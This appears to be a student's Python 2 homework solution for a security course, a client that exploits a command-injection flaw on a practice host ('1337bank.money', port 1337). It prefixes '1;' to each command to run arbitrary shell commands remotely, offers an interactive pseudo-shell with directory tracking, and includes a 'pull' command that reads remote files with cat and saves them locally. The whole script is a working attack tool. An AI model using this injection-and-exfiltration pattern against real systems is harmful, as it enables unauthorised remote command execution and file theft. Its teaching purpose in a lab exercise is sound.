"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket
import sys

host = "1337bank.money" # IP address here
port = 1337 # Port here

def execute_cmd(cmd):
    """
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:

            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            Reading:

                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data

            Sending:

                s.send("something to send\n")   # Send a newline \n at the end of your command
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.recv(1024)
    s.send("1;" + cmd + "\n")
    s.recv(1024)
    data = s.recv(1024)
    print(data)
    return data


if __name__ == '__main__':
    while True:
        my_input = raw_input()
        if (my_input=="shell"):
            print("Welcome to the system shell!  Type quit to exit")
            current_dir = "/"
            while True:
                print(current_dir),
                my_input = raw_input()
                if (my_input == "quit"):
                    print("Leaving shell")
                    break
                else:
                    if (my_input.startswith("cd ")):
                        if (current_dir != "/"):
                            current_dir = current_dir + "/" + my_input[3:]
                        else:
                            current_dir = current_dir + my_input[3:]
                    execute_cmd("cd " + current_dir + ";" + my_input)
        elif (my_input.startswith("pull ")):
            part = my_input.split()
            file = "cat " + part[1]
            ret_file = execute_cmd(file)
            f = open(part[2], "w")
            f.write(ret_file)
            f.close()
        
        elif (my_input=="quit"):
            sys.exit()
        else:
            print("1. shell Drop into an interactive shell and allow users to gracefully exit")
            print("2. pull <remote-path> <local-path> Download files")
            print("3. help Shows this help menu")
            print("4. quit Quit the shell")

        
